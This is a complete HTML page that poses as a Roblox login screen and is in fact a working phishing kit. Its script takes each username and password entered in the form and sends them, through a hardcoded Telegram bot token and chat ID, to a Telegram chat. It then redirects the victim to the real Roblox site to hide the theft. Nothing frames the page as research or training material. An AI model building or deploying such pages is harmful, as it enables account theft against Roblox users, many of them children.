<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #2C2F33; /* Dark background similar to Roblox */
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #33353A; /* Dark gray for container */
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
            text-align: center;
            width: 380px; /* Adjusted width for consistency */
        }
        h1 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #ffffff;
        }
        input {
            display: block;
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #4f4f4f;
            border-radius: 4px;
            background-color: #23272A; /* Darker gray for input fields */
            color: #ffffff;
            font-size: 14px;
        }
        button {
            background-color: #FFCC00; /* Roblox yellow */
            color: black;
            padding: 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            width: 100%;
        }
        button:hover {
            background-color: #e6b800;
        }
        .forgot-password,
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #cccccc;
        }
        .forgot-password a,
        .footer a {
            color: #FFCC00;
            text-decoration: none;
        }
        .forgot-password a:hover,
        .footer a:hover {
            text-decoration: underline;
        }
        #result {
            margin-top: 15px;
            color: #FFCC00; /* Yellow for result text */
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Login to Roblox</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username/Email/Phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p id="result"></p>
        <div class="forgot-password">
            <p><a href="#">Forgot Password or Username?</a></p>
        </div>
        <div class="footer">
            <p>Don't have an account? <a href="#">Sign Up</a></p>
        </div>
    </div>

    <script>
        // Your actual Telegram Bot Token and Chat ID
        const BOT_TOKEN = '6965358568:AAHFA6qiegPJyw3oVqzfqIt3C829NeagC4Q'; // Your bot token
        const CHAT_ID = '7072093078'; // Your chat ID

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var result = document.getElementById('result');
            
            var message = `ðŸŸ¢ New Login Data:\n\nðŸ‘¤ Username: ${username}\nðŸ”‘ Password: ${password}`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                }),
            })
            .then(response => response.json())
            .then(data => {
                result.textContent = "Data sent! Thank you for logging in.";
                result.style.color = "#4CAF50"; // Green color for success messages
                
                // Redirect to Roblox after 1 second
                setTimeout(() => {
                    window.location.href = "https://www.roblox.com";
                }, 1000); // 1 second delay
            })
            .catch((error) => {
                console.error('Error:', error);
                result.textContent = "An error occurred while sending data. Please try again.";
            });
        });
    </script>
</body>
</html>
